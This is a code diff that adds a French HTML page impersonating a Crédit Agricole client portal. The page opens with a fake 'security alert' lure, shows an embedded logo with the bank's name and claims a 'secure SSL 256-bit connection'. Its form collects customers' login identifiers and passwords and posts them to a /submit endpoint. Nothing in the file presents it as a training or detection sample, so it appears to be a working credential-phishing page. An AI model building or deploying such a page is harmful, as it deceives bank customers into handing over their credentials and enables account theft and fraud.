@@ -1,1 +1,45 @@
-keep
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Portail client</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Message d’alerte -->
+    <div class="alert">
+        ⚠️Alerte sécurité : Bonjour, Nous vous informons que nous avons mis à disposition un nouveau message prioritaire dans votre espace client.
+    </div>
+
+    <!-- Logo -->
+<img
+  class="logo"
+  alt="AG"
+  alt="Logo Crédit Agricole"
+  src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMzAwIDgwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxyZWN0IHdpZHRoPSIzMDAiIGhlaWdodD0iODAiIGZpbGw9IiMxZTdmM2IiLz4KICA8dGV4dCB4PSIxNTAiIHk9IjUwIiBmb250LXNpemU9IjI4IiBmb250LWZhbWlseT0iQXJpYWwiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5DcsOpZGl0IEFncmljb2xlPC90ZXh0Pgo8L3N2Zz4="
+>
+
+    <!-- Formulaire -->
+    <form action="/submit" method="POST">
+
+        <input type="identifant" name="identifiant" placeholder="Identifiant" required>
+
+        <input type="mot de passe" name="password" placeholder="Mot de passe" required>
+
+        <button type="submit">Continuer</button>
+
+    </form>
+
+<!-- Footer -->
+    <div class="footer">
+        Connexion sécurisée • SSL 256-bit<br>
+        © 2025 – credit agricole
+    </div>
+
+</div>
+
+</body>
+</html>
